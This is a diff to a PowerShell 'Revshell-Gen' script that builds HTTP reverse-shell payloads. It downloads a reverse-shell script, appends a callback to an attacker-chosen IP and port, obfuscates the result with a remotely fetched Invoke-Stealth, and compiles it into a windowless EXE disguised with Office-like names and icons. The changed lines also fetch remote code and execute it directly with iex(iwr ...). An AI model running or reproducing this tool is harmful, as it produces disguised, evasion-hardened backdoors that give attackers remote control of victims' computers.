@@ -1,7 +1,6 @@
-﻿[Console]::OutputEncoding = [System.Text.Encoding]::GetEncoding("utf-8")
+[Console]::OutputEncoding = [System.Text.Encoding]::GetEncoding("utf-8")
 $ProgressPreference = "SilentlyContinue" ; $ErrorActionPreference = "SilentlyContinue"
-$OSVersion = [Environment]::OSVersion.Platform ; if (!$OSVersion -like 'Unix') { $Host.UI.RawUI.BackgroundColor = 'Black' }
-Set-StrictMode -Off ; $Host.UI.RawUI.WindowTitle = "Revshell-Gen v2.5 - by @JoelGMSec"
+Set-StrictMode -Off ; $Host.UI.RawUI.WindowTitle = "Revshell-Gen v2.6 - by @JoelGMSec & @3v4Si0N"
 
 function Show-Banner { Clear-Host
     Write-Host
@@ -13,8 +12,8 @@ function Show-Banner { Clear-Host
     Write-Host "        \/                                              " -NoNewLine -ForegroundColor Blue ; Write-Host "                               \/  " -ForegroundColor Green
     Write-Host
     Write-Host "------------------------------------------------------------------------------------------" -ForegroundColor Gray
-    Write-Host "         [:::::: HTTP-revshell Payload Generator :: Created by @JoelGMSec ::::::]         " -ForegroundColor Yellow
-    Write-Host "   [:::::: HTTP-revshell by 3v4Si0N :: https://github.com/3v4Si0N/HTTP-revshell ::::::]   " -ForegroundColor Yellow
+    Write-Host "         [:::::: HTTP-revshell Payload Generator :: Created by @JoelGMSec & @3v4Si0N ::::::]         " -ForegroundColor Yellow
+    Write-Host "   [:::::: HTTP-revshell by @3v4Si0N :: https://github.com/3v4Si0N/HTTP-revshell ::::::]   " -ForegroundColor Yellow
     Write-Host "------------------------------------------------------------------------------------------" -ForegroundColor Gray
     Write-Host }
 
@@ -116,22 +115,15 @@ if($template -in 'Custom') {
 
     $AppName = "$CustomName" ; $Title = "$CustomTitle" ; $Company = "$CustomCompany" ; $Product = "$CustomProduct" ; $Version = "$CustomVersion" ; $Icon = "$CustomIcon" }
 
-# System & Other variables
-    if ($OSVersion -like 'Unix') { 
-        $ScriptPath = "./Invoke-WebRev.ps1"
-        $InvokeStealthPath = "./Invoke-Stealth.ps1"
-        $PS2exePath = "./ps2exe.ps1"
-        $OutfilePath = "./$AppName.exe"
-        $IconPath = "./$AppName.ico"
-        $ip = hostname -I | awk '{print $1}' }
-
-    else { 
-        $ScriptPath = "$env:temp\Invoke-WebRev.ps1"
-        $InvokeStealthPath = "$env:temp\Invoke-Stealth.ps1"
-        $PS2exePath = "$env:temp\ps2exe.ps1"
-        $OutfilePath = "$pwd\$AppName.exe"
-        $IconPath = "$env:temp\$AppName.ico"
-        $ip = (Get-WmiObject -Class Win32_NetworkAdapterConfiguration | where {$_.DefaultIPGateway -ne $null}).IPAddress | select-object -first 1 }
+# System variables
+$ScriptUrl = "https://raw.githubusercontent.com/3v4Si0N/HTTP-revshell/dev/Invoke-WebRev.ps1"
+$ScriptPath = "$env:temp\Invoke-WebRev.ps1"
+$InvokeStealthUrl = "https://darkbyte.net/invoke-stealth.php"
+$InvokeStealthPath = "$env:temp\Invoke-Stealth.ps1"
+$Ps2ExeUrl = "https://raw.githubusercontent.com/MScholtes/PS2EXE/master/Module/ps2exe.ps1"
+$OutfilePath = "$pwd\$AppName.exe"
+$IconPath = "$env:temp\$AppName.ico"
+$ip = (Get-WmiObject -Class Win32_NetworkAdapterConfiguration | where {$_.DefaultIPGateway -ne $null}).IPAddress | select-object -first 1
 
 # IP to connect
 $Host.UI.RawUI.ForegroundColor = 'Gray' ; Write-Host ; & $Question
@@ -153,7 +145,7 @@ $Host.UI.RawUI.ForegroundColor = 'Green' ; $cursortop = [System.Console]::get_Cu
 
 # Download Invoke-WebRev.ps1 & add content
 Write-Host ; Write-Host "[+] Downloading last version of Invoke-WebRev.. " -ForegroundColor Blue -NoNewLine
-(New-object System.net.webclient).DownloadFile("https://raw.githubusercontent.com/3v4Si0N/HTTP-revshell/dev/Invoke-WebRev.ps1","$ScriptPath")
+(New-object System.net.webclient).DownloadFile($ScriptUrl,"$ScriptPath")
 Write-Host "[OK]" -ForegroundColor Green ; Start-Sleep -milliseconds 2000
 
 # Open legitimate Office Application
@@ -175,17 +167,16 @@ Add-Content $ScriptPath "Invoke-WebRev -ip $ip -port $port $ssl"
 
 # Download Invoke-Stealth & Obfuscate Code
 Write-Host ; Write-Host "[+] Downloading last version of Invoke-Stealth.. " -ForegroundColor Blue -NoNewLine
-Invoke-WebRequest -UseBasicParsing https://darkbyte.net/invoke-stealth.php -outfile $InvokeStealthPath
+Invoke-WebRequest -UseBasicParsing $InvokeStealthUrl -outfile $InvokeStealthPath
 Write-Host "[OK]" -ForegroundColor Green ; Start-Sleep -milliseconds 2000
 & $InvokeStealthPath $ScriptPath -technique all -nobanner
 
 # Download PS2exe & Compile EXE file
 Write-Host "[+] Downloading PS2exe and generating payload.. " -ForegroundColor Blue -NoNewLine
-(New-object System.net.webclient).DownloadFile("https://raw.githubusercontent.com/MScholtes/PS2EXE/master/Module/ps2exe.ps1","$PS2exePath")
-if ($OSVersion -like 'Unix') { [System.Convert]::FromBase64String(($b64ico)) | Set-Content $IconPath -AsByteStream } else { [System.Convert]::FromBase64String(($b64ico)) | Set-Content $IconPath -Encoding Byte }
-if ($OSVersion -like 'Unix') { (Get-Content $PS2exePath).Replace("powershell","pwsh") | Set-Content $PS2exePath ; (Get-Content $PS2exePath).Replace("PowerShell","pwsh") | Set-Content $PS2exePath }
+iex(iwr -useb $Ps2ExeUrl)
+[System.Convert]::FromBase64String(($b64ico)) | Set-Content $IconPath -Encoding Byte
 Write-Host "[OK]" -ForegroundColor Green ; Start-Sleep -milliseconds 2000
-Import-Module $PS2exePath -Force ; Invoke-ps2exe -inputFile $ScriptPath -outputFile $OutfilePath -title $Title -company $Company -product $Product -version $Version -iconFile $IconPath -noConsole -noError 2>&1> $null
+Invoke-ps2exe -inputFile $ScriptPath -outputFile $OutfilePath -title $Title -company $Company -product $Product -version $Version -iconFile $IconPath -noConsole -noError 2>&1> $null
 
 Write-Host ; Write-Host "[i] Done!" -ForegroundColor Green ; Start-Sleep -milliseconds 2000
 
